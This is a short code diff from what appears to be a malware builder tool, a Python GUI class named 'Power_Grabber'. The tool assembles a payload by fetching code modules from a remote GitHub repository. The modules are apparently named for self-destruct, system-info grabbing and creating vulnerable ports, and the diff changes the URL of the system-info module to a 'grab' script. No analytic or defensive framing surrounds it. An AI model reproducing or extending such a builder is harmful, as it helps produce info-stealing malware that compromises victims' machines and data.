@@ -293,7 +293,7 @@ class Power_Grabber(ctk.CTk):
                 combined_code += "\n".join([line for line in destruct_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
                 all_imports.update(extract_imports(destruct_code))
             if 'System-Info' in enabled_features:
-                system_code = fetch_and_clean_code('https://raw.githubusercontent.com/stack-crash999/DARKWIRE-MAIN/refs/heads/main/System-Info.py')
+                system_code = fetch_and_clean_code('https://raw.githubusercontent.com/stack-crash999/DARKWIRE-MAIN/refs/heads/main/darkwire%20grab.py')
                 combined_code += "\n".join([line for line in system_code.splitlines() if not line.startswith(('import', 'from'))]) + "\n"
                 all_imports.update(extract_imports(system_code))
             if 'Vulnerable-port-creation' in enabled_features:
